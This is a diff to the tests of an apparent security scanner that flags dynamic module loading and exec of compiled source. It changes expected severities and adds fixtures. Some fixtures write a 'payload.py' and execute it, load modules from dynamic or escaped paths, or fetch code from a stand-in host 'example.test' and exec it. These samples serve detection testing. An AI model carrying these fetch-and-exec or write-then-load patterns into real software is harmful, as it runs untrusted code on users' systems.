@@ -37,16 +37,73 @@ class TestDynamicImports:
         # Test-fixture context -> demoted to inferred.
         assert hits[0].evidence_class == "inferred"
 
-    def test_module_from_spec_in_non_test_stays_direct(self, tmp_path):
-        """The real write-then-load attack (case02-write-py-loader) is NOT
-        test-path-shaped and must stay critical/direct under the gate."""
+    def test_module_from_spec_in_non_test_is_high(self, tmp_path):
+        """Constructing a module does not itself execute or modify code."""
         f = tmp_path / "loader.py"
         f.write_text("mod = importlib.util.module_from_spec(spec)\n")
         findings = scanner.scan_file(str(f), "loader.py")
         hits = [finding for finding in findings if finding.rule_id == "RD-SMOD-003"]
         assert len(hits) == 1
-        assert hits[0].severity == "critical"
+        assert hits[0].severity == "high"
         assert hits[0].evidence_class == "direct"
+
+    def test_fixed_sibling_loader_is_inferred_but_dynamic_path_is_not(self, tmp_path):
+        f = tmp_path / "loader.py"
+        f.write_text('''
+def fixed():
+    sibling = Path(__file__).resolve().parent / "worker.py"
+    spec = importlib.util.spec_from_file_location("worker", sibling)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+
+def dynamic(name):
+    path = Path(__file__).parent / name
+    spec = importlib.util.spec_from_file_location("other", path)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+
+def escaped():
+    path = Path(__file__).parent / "/unsafe.py"
+    spec = importlib.util.spec_from_file_location("unsafe", path)
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+''')
+        hits = [finding for finding in scanner.scan_file(str(f), "loader.py")
+                if finding.rule_id == "RD-SMOD-003"]
+        assert [(finding.line, finding.severity, finding.evidence_class)
+                for finding in hits] == [
+            (5, "critical", "inferred"), (11, "high", "direct"),
+            (17, "high", "direct")]
+
+    def test_written_module_executed_in_same_function_stays_critical(self, tmp_path):
+        f = tmp_path / "loader.py"
+        f.write_text('''
+def load():
+    Path("payload.py").write_text("print(42)")
+    spec = importlib.util.spec_from_file_location("payload", "payload.py")
+    mod = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(mod)
+''')
+        hits = [finding for finding in scanner.scan_file(str(f), "loader.py")
+                if finding.rule_id == "RD-SMOD-003"]
+        assert len(hits) == 1
+        assert hits[0].severity == "critical"
+
+    def test_generated_test_source_is_inferred_but_untrusted_source_is_direct(self, tmp_path):
+        test_file = tmp_path / "test_generated.py"
+        test_file.write_text('''
+def test_generated(measure):
+    src = measure._generate_daemon_script()
+    compile(src, "<daemon>", "exec")
+
+def test_untrusted(requests):
+    src = requests.get("https://example.test/payload").text
+    exec(compile(src, "<payload>", "exec"))
+''')
+        hits = [f for f in scanner.scan_file(str(test_file), "test_generated.py")
+                if f.rule_id == "RD-SMOD-004"]
+        assert [(f.line, f.evidence_class) for f in hits] == [
+            (4, "inferred"), (8, "direct")]
 
     def test_importlib_import_module_variable(self, tmp_path):
         f = tmp_path / "loader.py"
